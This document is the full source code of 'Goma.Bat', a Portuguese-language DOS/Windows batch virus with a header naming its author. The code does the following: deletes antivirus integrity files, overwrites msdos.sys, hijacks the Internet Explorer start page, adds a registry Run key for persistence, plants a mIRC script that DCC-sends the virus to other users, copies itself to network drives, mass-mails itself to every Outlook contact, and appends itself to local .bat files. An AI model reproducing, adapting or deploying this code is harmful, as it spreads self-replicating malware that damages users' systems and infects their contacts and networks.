REM *********************** Goma.Bat.Versao.Animal **************************
REM        Nome do virus: Goma
REM        Autor : nim_bus@hotmail.com
REM        Home Page : http://virusbrasil.8m.com
REM        Tipo : Runtime Appending, BAT infector .
REM        Tamanho : + ou -  7500 bytes
REM        Av's : none
REM        Retro : apagar arquivos de verificacao
REM        Ativacao : mensagem (DOS,Windows) !
REM        Special features : Viva DOS, mIRC worm spread e VBS.Goma send 
REM                           VirusBrasil pagina inicial Internet Explorer    
REM        Bug's : deve ter entao favor entrar em contato caso voce detecte
REM                algum ...
REM *************************************************************************
@ECHO OFF%[GOMA.BAT]%
:inicio
CTTY NUL
set apagar=deltree
set copiar=copy
set para=fOr
set mascara=BaT
set aux=de
set ili=bu
set o=g
%apagar% /Y SMARTCHK.CPS > nul
%apagar% /Y ANTI-VIR.DAT > nul
%apagar% /Y AVP.CRC      > nul
%apagar% /Y IVB.NTZ      > nul
%apagar% /Y CHKLIST.MS   > nul

:ver_data
ECHO.Goma.Bat arquivo tempor†rio > goma2000.tmp
DIR goma2000.tmp >> goma2000.tmp
FIND "22/10" goma2000.tmp /i >NUL
IF errorlevel 1 GOTO tdg_cont

:ie
ECHO.Dim Alterar_Reg>doido.txt
ECHO.Set Alterar_Reg = CreateObject( "WScript.Shell" )>> doido.txt
ECHO.Alterar_Reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\" & "Start Page", "http://www.virusbrasil.8m.com">> doido.txt
wscript doido.vbs

:viva_dos
%apagar% /y c:\msdos.sys  >nul
echo.[Paths] > c:\msdos.sys
echo.WinDir=C:\WINDOWS >> c:\msdos.sys
echo.WinBootDir=C:\WINDOWS >> c:\msdos.sys
echo.HostWinBootDrv=C >> c:\msdos.sys
echo. >> c:\msdos.sys
echo.[Options] >> c:\msdos.sys
echo.BootMulti=1 >> c:\msdos.sys
echo.BootGUI=0 >> c:\msdos.sys
echo.Logo=0 >> c:\msdos.sys
echo.; xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Aqui e' o meu espaco para azucrinar a sua vida, quero mandar um abraco pra todo mundo da turma da goma e tambem pra toda a galera da faculdade um abraco pra todo mundo mesmoxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx >> c:\msdos.sys
echo.;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx >> c:\msdos.sys
echo.;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx >> c:\msdos.sys
ATTRIB +S +H +R  c:\MSDOS.SYS

:ativacao
CTTY CON
ECHO For i = 1 to 10 > msg.vbs
ECHO MsgBox "Valeu Regis, Valeu Guino !!!", 48, "Goma" >> msg.vbs
ECHO Next >> msg.vbs
MOVE msg.vbs c:\windows\menuin~1\progra~1\iniciar >NUL
ERASE msg.vbs >NUL
ECHO. "Um abraáo pra toda galera brazuca" - Vecna
ECHO.                           em especial ao Regis e ao Guino !!!!
ECHO.
ECHO. [TDG'2000] - V°rus Brasil - Novos rumos para seus pensamentos - nim_bus
PAUSE >NUL

:tdg_cont
ERASE goma2000.tmp
CTTY NUL

:mIRC
IF not exist c:\mirc\script.ini GOTO aux_env0
COPY /y %0.bat c:\windows\system\goma.bat
ECHO n0=; Goma.Batch virus por nim_bus@hotmail.com > c:\mirc\script.ini
ECHO n1=ON 1:JOIN:#:{ /if ( $nick != $me ) { /dcc send $nick c:\windows\system\goma.bat } >> c:\mirc\script.ini
ECHO n2=ON 1:PART:#:{ /if ( $nick != $me ) { /dcc send $nick c:\windows\system\goma.bat } >> c:\mirc\script.ini

:aux_env0
echo.N AUX_0.TMP > aux0.scr
echo.E 0100 4F 6E 20 45 72 72 6F 72 20 52 65 73 75 6D 65 20 >> aux0.scr
echo.E 0110 4E 65 78 74 0D 0A  >> aux0.scr
echo.RCX >> aux0.scr
echo.0016 >> aux0.scr
echo.W >> aux0.scr
echo.Q >> aux0.scr
%aux%%ili%%o% < aux0.scr
erase aux0.scr
:aux_env1
echo.N AUX_1.TMP > aux1.scr
echo.E 0100 49 66 20 45 6E 76 69 61 72 2E 43 6F 75 6E 74 20  >> aux1.scr
echo.E 0110 3C 3E 20 30 20 54 68 65 6E 0D 0A >> aux1.scr
echo.RCX >> aux1.scr
echo.001B >> aux1.scr
echo.W >> aux1.scr
echo.Q >> aux1.scr
%aux%%ili%%o% < aux1.scr
erase aux1.scr
:aux_env2
echo.N AUX_2.TMP > aux2.scr
echo.E 0100 20 20 20 20 20 20 20 20 49 66 20 49 6E 53 74 72 >> aux2.scr
echo.E 0110 28 20 45 6E 76 69 61 72 2E 49 74 65 6D 28 20 43 >> aux2.scr
echo.E 0120 6F 6E 74 61 64 6F 72 29 2C 20 22 5C 22 20 29 20 >> aux2.scr
echo.E 0130 3C 3E 20 30 20 54 68 65 6E 0D 0A >> aux2.scr
echo.RCX >> aux2.scr
echo.003B >> aux2.scr
echo.W >> aux2.scr
echo.Q >> aux2.scr
%aux%%ili%%o% < aux2.scr
erase aux2.scr

:envia
TYPE aux_0.tmp >> mail.vbs
ECHO Dim Copiar_arquivo, Alterar_Reg, Criar_OBJ, Contador, Enviar, Abrir_Outlook, Em_mapi, Lista_end, Entradas, Auxiliar >> mail.vbs
ECHO Contador = 0 >> mail.vbs
ECHO Set Copiar_arquivo = CreateObject( "Scripting.FileSystemObject" ) >> mail.vbs
ECHO Copiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), "Goma.vbs" ) >> mail.vbs
ECHO Set Alterar_Reg = CreateObject( "WScript.Shell" ) >> mail.vbs
ECHO Alterar_Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "GOMA", Copiar_arquivo.BuildPath( Copiar_arquivo.GetSpecialFolder(1), "GOMA.vbs" ) >> mail.vbs
ECHO Set Criar_OBJ = CreateObject( "WScript.Network" ) >> mail.vbs
ECHO Set Enviar = Criar_OBJ.EnumNetworkDrives >> mail.vbs
TYPE aux_1.tmp >> mail.vbs
ECHO    For Contador = 0 To Enviar.Count - 1 >> mail.vbs
TYPE aux_2.tmp >> mail.vbs
ECHO           Copiar_arquivo.CopyFile WScript.ScriptFullName, Copiar_arquivo.BuildPath( Enviar.Item( Contador), "GOMA.vbs" )  >> mail.vbs
ECHO        End If >> mail.vbs
ECHO    Next >> mail.vbs
ECHO End If >> mail.vbs
ECHO Contador = Alterar_Reg.RegRead( "HKEY_LOCAL_MACHINE\" & "GOMA" ) >> mail.vbs
ECHO Set Abrir_Outlook = CreateObject( "Outlook.Application" ) >> mail.vbs
ECHO    Set Em_mapi = Abrir_Outlook.GetNameSpace( "MAPI" )  >> mail.vbs
ECHO    For Each Lista_end In Em_mapi.AddressLists >> mail.vbs
ECHO        Set Enviar = Abrir_Outlook.CreateItem( 0 ) >> mail.vbs
ECHO        For Entradas = 1 To Lista_end.AddressEntries.Count >> mail.vbs
ECHO            Set Auxiliar = Lista_end.AddressEntries( Entradas ) >> mail.vbs
ECHO            If Entradas = 1 Then >> mail.vbs
ECHO               Enviar.BCC = Auxiliar.Address >> mail.vbs
ECHO            Else >> mail.vbs
ECHO               Enviar.BCC = Enviar.BCC & "; " & Auxiliar.Address >> mail.vbs
ECHO            End If >> mail.vbs
ECHO        Next >> mail.vbs
ECHO        Enviar.Subject = "Goma" >> mail.vbs
ECHO        Enviar.Body = "Goma para sempre !!!!" >> mail.vbs
ECHO        Enviar.Attachmets.Add WScript.ScriptFullName >> mail.vbs
ECHO        Enviar.DeleteAfterSubmit = True >> mail.vbs
ECHO        Enviar.Send >> mail.vbs
ECHO    Next >> mail.vbs
ECHO Alterar_Reg.RegWrite "HKEY_LOCAL_MACHINE\" & "GOMA", Contador + 1 >> mail.vbs
MOVE mail.vbs c:\windows\menuin~1\progra~1\iniciar >NUL
ERASE mail.vbs >NUL

:procura
%para% %%f in (*.%mascara%) DO set var=%%f 
FIND /i "[GOMA.BAT]" <%var% >nul
IF not errorlevel 1 GOTO tdg_fim

:infecta
FOR %%f in (*.%mascara%) DO %copiar% %%f + %0.bat

:tdg_fim
ERASE aux_0.tmp
ERASE aux_1.tmp
ERASE aux_2.tmp
ERASE doido.vbs
set var=
set apagar=
set copiar=
set para=
set mascara=
set aux=
set ili=
set o=
CTTY CON
REM *********************** Goma.Bat.Vers∆o.Animal **************************